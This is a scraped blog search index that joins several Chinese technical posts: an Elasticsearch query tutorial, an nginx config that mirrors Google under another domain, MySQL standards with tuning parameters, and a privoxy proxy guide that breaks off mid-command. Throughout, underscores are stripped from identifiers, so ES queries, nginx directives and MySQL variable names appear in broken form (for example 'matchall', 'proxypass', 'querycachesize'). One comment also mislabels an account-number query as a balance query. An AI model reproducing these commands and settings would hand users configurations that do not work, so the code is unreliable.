'localhost:9200/bank/search?q=\u0026pretty'\n\n其中bank是查询的索引名称，q后面跟着搜索的条件：q=表示查询所有的内容\n\n请求体方式（推荐这种方式）\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"matchall\": {} }\n}'\n\n这种方式会把查询的内容放入body中，会造成一定的开销，但是易于理解。在平时的练习中，推荐这种方式。\n\n返回的内容\n复制代码\n\n{\n \"took\" : 26,\n \"timedout\" : false,\n \"shards\" : {\n   \"total\" : 5,\n   \"successful\" : 5,\n   \"failed\" : 0\n },\n \"hits\" : {\n   \"total\" : 1000,\n   \"maxscore\" : 1.0,\n   \"hits\" : [ {\n     \"index\" : \"bank\",\n     \"type\" : \"account\",\n     \"id\" : \"1\",\n     \"score\" : 1.0, \"source\" : {\"accountnumber\":1,\"balance\":39225,\"firstname\":\"Amber\",\"lastname\":\"Duke\",\"age\":32,\"gender\":\"M\",\"address\":\"880 Holmes Lane\",\"employer\":\"Pyrami\",\"email\":\"amberduke@pyrami.com\",\"city\":\"Brogan\",\"state\":\"IL\"}\n   }, {\n     \"index\" : \"bank\",\n     \"type\" : \"account\",\n     \"id\" : \"6\",\n     \"score\" : 1.0, \"source\" : {\"accountnumber\":6,\"balance\":5686,\"firstname\":\"Hattie\",\"lastname\":\"Bond\",\"age\":36,\"gender\":\"M\",\"address\":\"671 Bristol Street\",\"employer\":\"Netagy\",\"email\":\"hattiebond@netagy.com\",\"city\":\"Dante\",\"state\":\"TN\"}\n   }, {\n     \"index\" : \"bank\",\n     \"type\" : \"account\",\n     \"id\" : \"13\",\n\n复制代码\n\n返回的内容大致可以如下讲解：\n\ntook：是查询花费的时间，毫秒单位\n\ntimeout：标识查询是否超时\n\nshards：描述了查询分片的信息，查询了多少个分片、成功的分片数量、失败的分片数量等\n\nhits：搜索的结果，total是全部的满足的文档数目，hits是返回的实际数目（默认是10）\n\nscore是文档的分数信息，与排名相关度有关，参考各大搜索引擎的搜索结果，就容易理解。\n\n由于ES是一次性返回所有的数据，因此理解返回的内容是很必要的。它不像传统的SQL是先返回数据的一个子集，再通过数据库端的游标不断的返回数据（由于对传统的数据库理解的不深，这里有错还望指正）。\n查询语言DSL\n\nES支持一种JSON格式的查询，叫做DSL，domain specific language。这门语言刚开始比较难理解，因此通过几个简单的例子开始：\n\n下面的命令，可以搜索全部的文档：\n\n{\n \"query\": { \"matchall\": {} }\n}\n\nquery定义了查询，matchall声明了查询的类型。还有其他的参数可以控制返回的结果：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"matchall\": {} },\n \"size\": 1\n}'\n\n上面的命令返回了所有文档数据中的第一条文档。如果size不指定，那么默认返回10条。\n\n下面的命令请求了第10-20的文档。\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"matchall\": {} },\n \"from\": 10,\n \"size\": 10\n}'\n\n复制代码\n\n下面的命令指定了文档返回的排序方式：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"matchall\": {} },\n \"sort\": { \"balance\": { \"order\": \"desc\" } }\n}'\n\n执行搜索\n\n上面了解了基本的搜索语句，下面就开始深入一些常用的DSL了。\n\n之前的返回数据都是返回文档的所有内容，这种对于网络的开销肯定是有影响的，下面的例子就指定了返回特定的字段：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"matchall\": {} },\n \"source\": [\"accountnumber\", \"balance\"]\n}'\n\n再回到query，之前的查询都是查询所有的文档，并不能称之为搜索引擎。下面就通过match方式查询特定字段的特定内容，比如查询余额为20的账户信息：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"match\": { \"accountnumber\": 20 } }\n}'\n\n查询地址为mill的信息：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"match\": { \"address\": \"mill\" } }\n}'\n\n查询地址为mill或者lane的信息：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"match\": { \"address\": \"mill lane\" } }\n}'\n\n如果我们想要返回同时包含mill和lane的，可以通过matchphrase查询：\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": { \"matchphrase\": { \"address\": \"mill lane\" } }\n}'\n\nES提供了bool查询，可以把很多小的查询组成一个更为复杂的查询，比如查询同时包含mill和lane的文档：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": {\n   \"bool\": {\n     \"must\": [\n       { \"match\": { \"address\": \"mill\" } },\n       { \"match\": { \"address\": \"lane\" } }\n     ]\n   }\n }\n}'\n\n复制代码\n\n修改bool参数，可以改为查询包含mill或者lane的文档：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": {\n   \"bool\": {\n     \"should\": [\n       { \"match\": { \"address\": \"mill\" } },\n       { \"match\": { \"address\": \"lane\" } }\n     ]\n   }\n }\n}'\n\n复制代码\n\n也可以改写为mustnot，排除包含mill和lane的文档：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": {\n   \"bool\": {\n     \"mustnot\": [\n       { \"match\": { \"address\": \"mill\" } },\n       { \"match\": { \"address\": \"lane\" } }\n     ]\n   }\n }\n}'\n\n复制代码\n\nbool查询可以同时使用must, should, mustnot组成一个复杂的查询：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": {\n   \"bool\": {\n     \"must\": [\n       { \"match\": { \"age\": \"40\" } }\n     ],\n     \"mustnot\": [\n       { \"match\": { \"state\": \"ID\" } }\n     ]\n   }\n }\n}'\n\n复制代码\n过滤查询\n\n之前说过score字段指定了文档的分数，使用查询会计算文档的分数，最后通过分数确定哪些文档更相关，返回哪些文档。\n\n有的时候我们可能对分数不感兴趣，就可以使用filter进行过滤，它不会去计算分值，因此效率也就更高一些。\n\nfilter过滤可以嵌套在bool查询内部使用，比如想要查询在2000-3000范围内的所有文档，可以执行下面的命令：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"query\": {\n   \"bool\": {\n     \"must\": { \"matchall\": {} },\n     \"filter\": {\n       \"range\": {\n         \"balance\": {\n           \"gte\": 20000,\n           \"lte\": 30000\n         }\n       }\n     }\n   }\n }\n}'\n\n复制代码\n\nES除了上面介绍过的范围查询range、matchall、match、bool、filter还有很多其他的查询方式，这里就先不一一说明了。\n聚合\n\n聚合提供了用户进行分组和数理统计的能力，可以把聚合理解成SQL中的GROUP BY和分组函数。在ES中，你可以在一次搜索查询的时间内，即完成搜索操作也完成聚合操作，这样就降低了多次使用REST API造成的网络开销。\n\n下面就是通过terms聚合的简单样例：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"size\": 0,\n \"aggs\": {\n   \"groupbystate\": {\n     \"terms\": {\n       \"field\": \"state\"\n     }\n   }\n }\n}'\n\n复制代码\n\n它类似于SQL中的下面的语句：\n\nSELECT state, COUNT() FROM bank GROUP BY state ORDER BY COUNT() DESC\n\n返回的数据：\n复制代码\n\n\"hits\" : {\n   \"total\" : 1000,\n   \"maxscore\" : 0.0,\n   \"hits\" : [ ]\n },\n \"aggregations\" : {\n   \"groupbystate\" : {\n     \"buckets\" : [ {\n       \"key\" : \"al\",\n       \"doccount\" : 21\n     }, {\n       \"key\" : \"tx\",\n       \"doccount\" : 17\n     }, {\n       \"key\" : \"id\",\n       \"doccount\" : 15\n     }, {\n       \"key\" : \"ma\",\n       \"doccount\" : 15\n     }, {\n       \"key\" : \"md\",\n       \"doccount\" : 15\n     }, {\n       \"key\" : \"pa\",\n       \"doccount\" : 15\n     }, {\n       \"key\" : \"dc\",\n       \"doccount\" : 14\n     }, {\n       \"key\" : \"me\",\n       \"doccount\" : 14\n     }, {\n       \"key\" : \"mo\",\n       \"doccount\" : 14\n     }, {\n       \"key\" : \"nd\",\n       \"doccount\" : 14\n     } ]\n   }\n }\n}\n\n复制代码\n\n由于size设置为0，它并没有返回文档的信息，只是返回了聚合的结果。\n\n比如统计不同账户状态下的平均余额：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"size\": 0,\n \"aggs\": {\n   \"groupbystate\": {\n     \"terms\": {\n       \"field\": \"state\"\n     },\n     \"aggs\": {\n       \"averagebalance\": {\n         \"avg\": {\n           \"field\": \"balance\"\n         }\n       }\n     }\n   }\n }\n}'\n\n复制代码\n\n聚合支持嵌套，举个例子，先按范围分组，在统计不同性别的账户余额：\n复制代码\n\ncurl -XPOST 'localhost:9200/bank/search?pretty' -d '\n{\n \"size\": 0,\n \"aggs\": {\n   \"groupbyage\": {\n     \"range\": {\n       \"field\": \"age\",\n       \"ranges\": [\n         {\n           \"from\": 20,\n           \"to\": 30\n         },\n         {\n           \"from\": 30,\n           \"to\": 40\n         },\n         {\n           \"from\": 40,\n           \"to\": 50\n         }\n       ]\n     },\n     \"aggs\": {\n       \"groupbygender\": {\n         \"terms\": {\n           \"field\": \"gender\"\n         },\n         \"aggs\": {\n           \"average_balance\": {\n             \"avg\": {\n               \"field\": \"balance\"\n             }\n           }\n         }\n       }\n     }\n   }\n }\n}'\n\n复制代码\n\n聚合可以实现很多复杂的功能，而且ES也提供了很多复杂的聚合，这里作为引导篇，也不过多介绍了。\n\n对于基本的数据搜索大致就是上面讲述的样子，熟悉了一些常用的API，入门还是很简单的，倒是要熟练使用ES，还是需要掌握各种搜索查询的命令，以及ES内部的原理。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx反代google","title":"Linux命令 Nginx反向代理 Google","text":"分享一下我的 Nginx 反向代理 Google 以及草榴等的参数配置 - V2EX\n\n1、这里监听了80和443端口，用了ssl加密，高大上。ssl证书是免费的，startssl，自己去申请个吧。\n 2、定义了个upstream google，放了5个谷歌的ip，如果不这样做，就等着被谷歌的验证码搞崩溃吧。\n3、也设置了反向代理缓存，某些资源不用重复去请求谷歌获取，加快搜索速度。\n 4、proxyredirect https://www.google.com/ /; 这行的作用是把谷歌服务器返回的302响应头里的域名替换成我们的，不然浏览器还是会直接请求www.google.com，那样反向代理就失效了。\n5、proxycookiedomain google.com centos.bz; 把cookie的作用域替换成我们的域名。\n 6、proxypass http://google; 反向代理到upstream google，会随机把请求分配到那几个ip。忘记说了，那几个ip可以在自己的vps或服务器上使用nslookup www.google.com获取。\n7、proxysetheader Accept-Encoding “”; 防止谷歌返回压缩的内容，因为压缩的内容我们无法作域名替换。\n 8、proxysetheader Accept-Language “zh-CN”;设置语言为中文\n9、proxysetheader Cookie “PREF=ID=047808f19f6de346:U=0f62f33dd8549d11:FF=2:LD=zh-CN:NW=1:TM=1325338577:LM=1332142444:GM=1:SG=2:S=rE0SyJh2w1IQ-Maw”; 这行很关键，传固定的cookie给谷歌，是为了禁止即时搜索，因为开启即时搜索无法替换内容。还有设置为新窗口打开网站，这个符合我们打开链接的习惯。\n 10、subfilter www.google.com www.centos.bz;当然是把谷歌的域名替换成我们的了，注意需要安装nginx的subfilter模块\nproxycachepath  /data/nginx/cache/one  levels=1:2   keyszone=one:10m maxsize=10g;\nproxycachekey  \"$host$requesturi\";\n\nserver {\n  listen 80;\n  servername www.centos.bz centos.bz;\n  rewrite ^(.*) https://www.centos.bz$1 permanent;\n}\n\nupstream google {\n  server 74.125.224.80:80 maxfails=3;\n  server 74.125.224.81:80 maxfails=3;\n  server 74.125.224.82:80 maxfails=3;\n  server 74.125.224.83:80 maxfails=3;\n  server 74.125.224.84:80 maxfails=3;\n}\nserver {\n  listen      443;\n  servername  www.centos.bz centos.bz;\n\n  # ssl on;\n  # sslcertificate      /etc/nginx/ca/server.crt;\n  # sslcertificatekey  /etc/nginx/ca/server.key;\n  # sslprotocols        TLSv1 TLSv1.1 TLSv1.2;\n  # sslciphers          HIGH:!aNULL:!MD5;\n  # sslpreferserverciphers  on;\n\n  location / {\n    proxycache one;\n    proxycachevalid  200 302  1h;\n    proxycachevalid  404      1m;\n    proxyredirect https://www.google.com/ /;\n    proxycookiedomain google.com centos.bz;\n    proxypass              http://google;\n    proxysetheader Host \"www.google.com\";\n    proxysetheader Accept-Encoding \"\";\n    proxysetheader User-Agent $httpuseragent;\n    proxysetheader Accept-Language \"zh-CN\";\n    proxysetheader Cookie \"PREF=ID=047808f19f6de346:U=0f62f33dd8549d11:FF=2:LD=zh-CN:NW=1:TM=1325338577:LM=1332142444:GM=1:SG=2:S=rE0SyJh2w1IQ-Maw\";\n    subfilter www.google.com www.centos.bz;\n    subfilteronce off;\n  }\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx Upload","title":"Linux命令 Nginx","text":"使用Nginx Upload Module实现上传文件功能 - 降龙 | 记录生活与工作的点滴，分享旅行与技术的乐趣。","tags":null},{"location":"//blog.pytool.com/Post/数据库/mysql运维及开发规范","title":"MySQL运维及开发规范","text":"MySQL运维及开发规范\n\n一.基础规范\n(1) 使用INNODB存储引擎\n(2) 表字符集使用UTF8\n(3) 所有表都需要添加注释\n(4) 单表数据量建议控制在5000W以内\n(5) 不在数据库中存储图、文件等大数据\n(6) 禁止在线上做数据库压力测试\n(7) 禁从测试、开发环境直连数据库\n\n二.命名规范\n(1) 库名表名字段名必须有固定的命名长度，12个字符以内\n(2) 库名、表名、字段名禁止超过32个字符。须见名之意\n(3) 库名、表名、字段名禁止使用MySQL保留字\n(4) 临时库、表名必须以tmp为前缀，并以日期为后缀\n(5) 备份库、表必须以bak为前缀，并以日期为后缀\n\n三.库、表、字段开发设计规范\n(1) 禁使用分区表\n(2) 拆分大字段和访问频率低的字段，分离冷热数据\n(3) 用HASH进散表，表名后缀使进制数，下标从0开始\n(4) 按日期时间分表需符合YYYYMM[HH]格式\n(5) 采用合适的分库分表策略。例如千库十表、十库百表等\n(6) 尽可能不使用TEXT、BLOB类型\n(7) 用DECIMAL代替FLOAT和DOUBLE存储精确浮点数\n(8) 越简单越好：将字符转化为数字、使用TINYINT来代替ENUM类型\n(9) 所有字段均定义为NOT NULL\n(10) 使用UNSIGNED存储非负整数\n(11) INT类型固定占用4字节存储\n(12) 使用timestamp存储时间\n(13) 使用INT UNSIGNED存储IPV4\n(14) 使用VARBINARY存储大小写敏感的变长字符串\n(15) 禁止在数据库中存储明文密码，把密码加密后存储\n(16) 用好数值类型字段\n     Tinyint      (1Byte)\n     smallint     (2Byte)\n     mediumint   (3Byte)\n     int         (4Byte)\n     bigint       (8Byte)\n     如果数值字段没有那么大，就不要用 bigint\n(17) 存储ip最好用int存储而非char(15)\n(18) 不允许使用ENUM\n(19) 避免使用NULL字段\n     NULL字段很难查询优化，NULL字段的索引需要额外空间，NULL字段的复合索引无效\n(20) 少用text/blob，varchar的性能会比text高很多，实在避免不了blob，请拆表\n(21) 数据库中不允许存储大文件，或者照片，可以将大对象放到磁盘上，数据库中存储它的路径\n\n四.索引规范\n1、索引的数量要控制：\n(1) 单张表中索引数量不超过5个\n(2) 单个索引中的字段数不超过5个\n(3) 对字符串使用前缀索引，前缀索引长度不超过8个字符\n(4) 建议优先考虑前缀索引，必要时可添加伪列并建立索引\n2、主键准则\n(1) 表必须有主键\n(2) 不使用更新频繁的列作为主键\n(3) 尽量不选择字符串列作为主键\n(4) 不使用UUID MD5 HASH这些作为主键(数值太离散了)\n(5) 默认使非空的唯一键作为主键\n(6) 建议选择自增或发号器\n3、重要的SQL必须被索引，比如：\n(1) UPDATE、DELETE语句的WHERE条件列\n(2) ORDER BY、GROUP BY、DISTINCT的字段\n4、多表JOIN的字段注意以下：\n(1) 区分度最大的字段放在前面\n(2) 核SQL优先考虑覆盖索引\n(3) 避免冗余和重复索引\n(4) 索引要综合评估数据密度和分布以及考虑查询和更新比例\n5、索引禁忌\n(1) 不在低基数列上建立索引，例如“性别”\n(2) 不在索引列进行数学运算和函数运算\n6、尽量不使用外键\n(1) 外键用来保护参照完整性，可在业务端实现\n(2) 对父表和子表的操作会相互影响，降低可用性\n7、索引命名：非唯一索引必须以 idx字段1字段2命名，唯一索引必须以uniq字段1字段2命名，索引名称必须全部小写\n8、新建的唯一索引必须不能和主键重复\n9、索引字段的默认值不能为NULL，要改为其他的default或者空。NULL非常影响索引的查询效率\n10、反复查看与表相关的SQL，符合最左前缀的特点建立索引。多条字段重复的语句，要修改语句条件字段的顺序，为其建立一条联合索引，减少索引数量\n11、能使用唯一索引就要使用唯一索引，提高查询效率\n12、研发要经常使用explain，如果发现索引选择性差，必须让他们学会使用hint\n\n五.SQL规范\n(1) sql语句尽可能简单\n    大的sql想办法拆成小的sql语句(充分利用QUERY CACHE和充分利用多核CPU)\n(2) 事务要简单，整个事务的时间长度不要太长\n(3) 避免使用触发器、函数、存储过程\n(4) 降低业务耦合度，为sacle out、sharding留有余地\n(5) 避免在数据库中进数学运算(MySQL不擅长数学运算和逻辑判断)\n(6) 不要用select ，查询哪几个字段就select 这几个字段\n(7) sql中使用到 OR 的改写为用 IN()   (or的效率没有in的效率高)\n(8) in里面数字的个数建议控制在1000以内\n(9) limit分页注意效率。Limit越大，效率越低。可以改写limit，比如例子改写：\n     select id from t limit 10000, 10;  =  select id from t where id   10000 limit10;\n(10)  使用union all替代union\n(11） 避免使大表的JOIN\n(12) 使用group by 分组、自动排序\n(13) 对数据的更新要打散后批量更新，不要一次更新太多数据\n(14) 减少与数据库的交互次数\n(15) 注意使用性能分析工具\n     Sql explain  /  showprofile   /    mysqlsla\n(16) SQL语句要求所有研发，SQL关键字全部是大写，每个词只允许有一个空格\n(17) SQL语句不可以出现隐式转换，比如 select id from 表 where id='1'\n(18) IN条件里面的数据数量要少，我记得应该是500个以内，要学会使用exist代替in，exist在一些场景查询会比in快\n(19) 能不用NOT IN就不用NOTIN，坑太多了。。会把空和NULL给查出来\n(20) 在SQL语句中，禁止使用前缀是%的like\n(21) 不使用负向查询，如not in/like\n(22) 关于分页查询：程序里建议合理使用分页来提高效率limit，offset较大要配合子查询使用\n(23) 禁止在数据库中跑大查询\n(24) 使预编译语句，只传参数，比传递SQL语句更高效；一次解析，多次使用；降低SQL注入概率\n(25) 禁止使order by rand()\n(26) 禁单条SQL语句同时更新多个表\n\n六.流程规范\n(1) 所有的建表操作需要提前告知该表涉及的查询sql；\n(2) 所有的建表需要确定建立哪些索引后才可以建表上线；\n(3) 所有的改表结构、加索引操作都需要将涉及到所改表的查询sql发出来告知DBA等相关人员；\n(4) 在建新表加字段之前，要求研发至少要提前3天邮件出来，给dba们评估、优化和审核的时间\n(5) 批量导入、导出数据必须提前通知DBA协助观察\n(6) 禁在线上从库执行后台管理和统计类查询\n(7) 禁有super权限的应用程序账号存在\n(8) 推广活动或上线新功能必须提前通知DBA进行流量评估\n(9) 不在业务高峰期批量更新、查询数据库\n\n六.配置优化规范\n(1) 开启慢查询，用于sql语句分析。show variables like \"%slow%\"; show global status like ‘%slow%’;\n    set global slowquerylog=ON;\n    [mysqld]\n    log-slow-queries=/var/lib/mysql/slowquery.log (指定日志文件存放位置，可以为空，系统会给一个缺省的文件 hostname-slow.log)\n    longquerytime=2                             (记录超过的时间，默认为10s)\n    log-queries-not-using-indexes                 (log下来没有使用索引的query,可以根据情况决定是否开启)\n    log-long-format                               (如果设置了，所有没有使用索引的查询也将被记录)\n\n    mysqldumpslow -s c -t 20 host-slow.log\n(2) 开启二进制日志，用于遇到mysql崩溃，数据恢复\n(3) no-auto-rehash 确保这个服务启动得比较快。\n(4) backlog = 600  \n    在MYSQL暂时停止响应新请求之前，短时间内的多少个请求可以被存在堆栈中。如果系统在短时间内有很多连接，则需要增大该参数的值，该参数值指定到来的TCP/IP连接的监听队列的大小。默认值80。\n(5) maxconnections = 3000  \n    #MySQL允许最大的进程连接数，如果经常出现Too Many Connections的错误提示，则需要增大此值。默认151\n(6) maxconnecterrors = 6000  \n    #设置每个主机的连接请求异常中断的最大次数，当超过该次数，MYSQL服务器将禁止host的连接请求，直到mysql服务器重启或通过flush hosts命令清空此host的相关信息。默认100\n(7) external-locking = FALSE  \n    #使用–skip-external-locking MySQL选项以避免外部锁定。该选项默认开启\n(8) maxallowedpacket = 32M  \n    #设置在网络传输中一次消息传输量的最大值。系统默认值 为4MB，最大值是1GB，必须设置1024的倍数。\n(9) sortbuffersize = 2M  \n    #SortBufferSize 是一个connection级参数，在每个connection（session）第一次需要使用这个buffer的时候，一次性分配设置的内存。\n    #SortBufferSize 并不是越大越好，由于是connection级的参数，过大的设置+高并发可能会耗尽系统内存资源。例如：500个连接将会消耗 500sortbuffersize(8M)=4G内存\n    #SortBufferSize 超过2KB的时候，就会使用mmap() 而不是 malloc() 来进行内存分配，导致效率降低。 系统默认2M，使用默认值即可\n(10)joinbuffersize = 2M  \n    #用于表间关联缓存的大小，和sortbuffersize一样，该参数对应的分配内存也是每个连接独享。系统默认2M，使用默认值即可\n(11)threadcachesize = 300  \n    #默认38 服务器线程缓存这个值表示可以重新利用保存在缓存中线程的数量,当断开连接时如果缓存中还有空间,那么客户端的线程将被放到缓存中,如果线程重新被请求，那么请求将从缓存中读取,如果缓存中是空的或者是新的请求，那么这个线程将被重新创建,如果有很多新的线程，增加这个值可以改善系统性能.通过比较 Connections 和 Threadscreated 状态的变量，可以看到这个变量的作用。设置规则如下：1GB 内存配置为8，2GB配置为16，3GB配置为32，4GB或更高内存，可配置更大。\n(12)threadconcurrency = 8  \n    #系统默认为10，使用10先观察 ,设置threadconcurrency的值的正确与否, 对mysql的性能影响很大, 在多个cpu(或多核)的情况下，错误设置了threadconcurrency的值, 会导致mysql不能充分利用多cpu(或多核), 出现同一时刻只能一个cpu(或核)在工作的情况。threadconcurrency应设为CPU核数的2倍. 比如有一个双核的CPU, 那么threadconcurrency的应该为4; 2个双核的cpu, threadconcurrency的值应为8\n(13)querycachesize = 64M  \n    #在MyISAM引擎优化中，这个参数也是一个重要的优化参数。但也爆露出来一些问题。机器的内存越来越大，习惯性把参数分配的值越来越大。这个参数加大后也引发了一系列问题。我们首先分析一下 querycachesize的工作原理：一个SELECT查询在DB中工作后，DB会把该语句缓存下来，当同样的一个SQL再次来到DB里调用时，DB在该表没发生变化的情况下把结果从缓存中返回给Client。这里有一个关建点，就是DB在利用Querycache工作时，要求该语句涉及的表在这段时间内没有发生变更。那如果该表在发生变更时，Querycache里的数据又怎么处理呢？首先要把Querycache和该表相关的语句全部置为失效，然后在写入更新。那么如果Querycache非常大，该表的查询结构又比较多，查询语句失效也慢，一个更新或是Insert就会很慢，这样看到的就是Update或是Insert怎么这么慢了。所以在数据库写入量或是更新量也比较大的系统，该参数不适合分配过大。而且在高并发，写入量大的系统，建议把该功能禁掉。\n(14)querycachelimit = 4M  \n    #指定单个查询能够使用的缓冲区大小，缺省为1M\n(15)querycacheminresunit = 2k  \n     #默认是4KB，设置值大对大数据查询有好处，但如果你的查询都是小数据查询，就容易造成内存碎片和浪费\n     #查询缓存碎片率 = Qcachefreeblocks / Qcachetotalblocks  100%\n     #如果查询缓存碎片率超过20%，可以用FLUSH QUERY CACHE整理缓存碎片，或者试试减小querycacheminresunit，如果你的查询都是小数据量的话。\n     #查询缓存利用率 = (querycachesize – Qcachefreememory) / querycachesize  100%\n     #查询缓存利用率在25%以下的话说明querycachesize设置的过大，可适当减小;查询缓存利用率在80%以上而且Qcachelowmemprunes   50的话说明querycachesize可能有点小，要不就是碎片太多。\n     #查询缓存命中率 = (Qcachehits – Qcacheinserts) / Qcachehits * 100%\n(16)threadstack = 192K  \n     #设置MYSQL每个线程的堆栈大小，默认值足够大，可满足普通操作。可设置范围为128K至4GB，默认为256KB，使用默认观察\n(17)transactionisolation = READ-COMMITTED  \n     # 设定默认的事务隔离级别.可用的级别如下:READ UNCOMMITTED-读未提交 READ COMMITTE-读已提交 REPEATABLE READ -可重复读 SERIALIZABLE -串行\n(18)tmptablesize = 256M  \n     # tmptablesize 的默认大小是 32M。如果一张临时表超出该大小，MySQL产生一个 The table tblname is full 形式的错误，如果你做很多高级 GROUP BY 查询，增加 tmptablesize 值。如果超过该值，则会将临时表写入磁盘。\n(18)maxheaptablesize = 256M\n(19)expirelogsdays = 7  \n(20)keybuffersize = 2048M  \n     #批定用于索引的缓冲区大小，增加它可以得到更好的索引处理性能，对于内存在4GB左右的服务器来说，该参数可设置为256MB或384MB。\n(21)readbuffersize = 1M  \n     #默认128K\n     # MySql读入缓冲区大小。对表进行顺序扫描的请求将分配一个读入缓冲区，MySql会为它分配一段内存缓冲区。readbuffersize变量控制这一缓冲区的大小。如果对表的顺序扫描请求非常频繁，并且你认为频繁扫描进行得太慢，可以通过增加该变量值以及内存缓冲区大小提高其性能。和sortbuffersize一样，该参数对应的分配内存也是每个连接独享。\n(22)readrndbuffersize = 16M  \n     # MySql的随机读（查询操作）缓冲区大小。当按任意顺序读取行时(例如，按照排序顺序)，将分配一个随机读缓存区。进行排序查询时，MySql会首先扫描一遍该缓冲，以避免磁盘搜索，提高查询速度，如果需要排序大量数据，可适当调高该值。但MySql会为每个客户连接发放该缓冲空间，所以应尽量适当设置该值，以避免内存开销过大。\n(23)bulkinsertbuffersize = 64M  \n     #批量插入数据缓存大小，可以有效提高插入效率，默认为8M\n(24)myisamsortbuffersize = 128M  \n     # MyISAM表发生变化时重新排序所需的缓冲 默认8M\n(25)myisammaxsortfilesize = 10G  \n     # MySQL重建索引时所允许的最大临时文件的大小 (当 REPAIR, ALTER TABLE 或者 LOAD DATA INFILE).\n     # 如果文件大小比此值更大,索引会通过键值缓冲创建(更慢)\n(26)myisammaxextrasortfilesize = 10G 5.6无此值设置\n(27)myisamrepairthreads = 1   默认为1\n     # 如果一个表拥有超过一个索引, MyISAM 可以通过并行排序使用超过一个线程去修复他们.\n     # 这对于拥有多个CPU以及大量内存情况的用户,是一个很好的选择.\n(28)innodbadditionalmempoolsize = 16M  \n     #这个参数用来设置 InnoDB 存储的数据目录信息和其它内部数据结构的内存池大小，类似于Oracle的library cache。这不是一个强制参数，可以被突破。\n(29)innodbbufferpoolsize = 2048M  \n     # 这对Innodb表来说非常重要。Innodb相比MyISAM表对缓冲更为敏感。MyISAM可以在默认的 keybuffersize 设置下运行的可以，然而Innodb在默认的 innodbbufferpoolsize 设置下却跟蜗牛似的。由于Innodb把数据和索引都缓存起来，无需留给操作系统太多的内存，因此如果只需要用Innodb的话则可以设置它高达 70-80% 的可用内存。一些应用于 keybuffer 的规则有 — 如果你的数据量不大，并且不会暴增，那么无需把 innodbbufferpoolsize 设置的太大了\n(30)#innodbdatafilepath = ibdata1:1024M:autoextend 设置过大导致报错，默认12M观察\n     #表空间文件 重要数据\n(31)#innodbfileiothreads = 4   不明确，使用默认值\n     #文件IO的线程数，一般为 4，但是在 Windows 下，可以设置得较大。\n(32)innodbthreadconcurrency = 8  \n     #服务器有几个CPU就设置为几，建议用默认设置，一般为8.\n(33)innodbflushlogattrxcommit = 2  \n     # 如果将此参数设置为1，将在每次提交事务后将日志写入磁盘。为提供性能，可以设置为0或2，但要承担在发生故障时丢失数据的风险。设置为0表示事务日志写入日志文件，而日志文件每秒刷新到磁盘一次。设置为2表示事务日志将在提交时写入日志，但日志文件每次刷新到磁盘一次。\n(34)#innodblogbuffersize = 16M   使用默认8M\n     #此参数确定些日志文件所用的内存大小，以M为单位。缓冲区更大能提高性能，但意外的故障将会丢失数据.MySQL开发人员建议设置为1－8M之间\n(35)#innodblogfilesize = 128M  使用默认48M\n     #此参数确定数据日志文件的大小，以M为单位，更大的设置可以提高性能，但也会增加恢复故障数据库所需的时间\n(36)#innodblogfilesingroup = 3   使用默认2\n     #为提高性能，MySQL可以以循环方式将日志文件写到多个文件。推荐设置为3M\n(37)#innodbmaxdirtypagespct = 90  使用默认75观察\n     # BufferPool中DirtyPage所占的数量，直接影响InnoDB的关闭时间。参数innodbmaxdirtypagespct 可以直接控制了DirtyPage在BufferPool中所占的比率，而且幸运的是innodbmaxdirtypagespct是可以动态改变的。所以，在关闭InnoDB之前先将innodbmaxdirtypagespct调小，强制数据块Flush一段时间，则能够大大缩短 MySQL关闭的时间。\n(38)innodblockwaittimeout = 120  \n     #默认为50秒 InnoDB 有其内置的死锁检测机制，能导致未完成的事务回滚。但是，如果结合InnoDB使用MyISAM的lock tables 语句或第三方事务引擎,则InnoDB无法识别死锁。为消除这种可能性，可以将innodblockwaittimeout设置为一个整数值，指示 MySQL在允许其他事务修改那些最终受事务回滚的数据之前要等待多长时间(秒数)\n(39)innodbfileper_table = 0  \n    #默认为No #独享表空间（关闭）","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 privoxy","title":"Linux命令 privoxy","text":"privoxy有将socks代理转为http代理的功能。\n\n1.开启shadowsocks，socks代理地址为127.0.0.1:1080。\n\n2.安装privoxy。\n\n$ sudo apt-get install privoxy\n\n3.更改provoxy配置，位置在“/etc/privoxy/config”。\n\n$ sudo vim /etc/privoxy/config\n\n在里面添加一条：\n\n在 froward-socks4下面添加一条socks5的，因为shadowsocks为socks5，\n 地址是127.0.0.1:1080。注意他们最后有一个“.”\n\nforward-socks4   /               socks-gw.example.com:1080  .\nforward-socks5   /               127.0.0.1:1080 .\n\n 下面还存在以下一条配置，表示privoxy监听本机8118端口，\n把它作为http代理，代理地址为 http://localhost.8118/ 。\n 可以把地址改为 0.0.0.0:8118，表示外网也可以通过本机IP作http代理。\n这样，你的外网IP为1.2.3.4，别人就可以设置 http://1.2.3.4:8118/ 为http代理。\n\n　listen-address localhost:8118\n\n4.然后重启privoxy。\n\n$ sudo systemctl restart 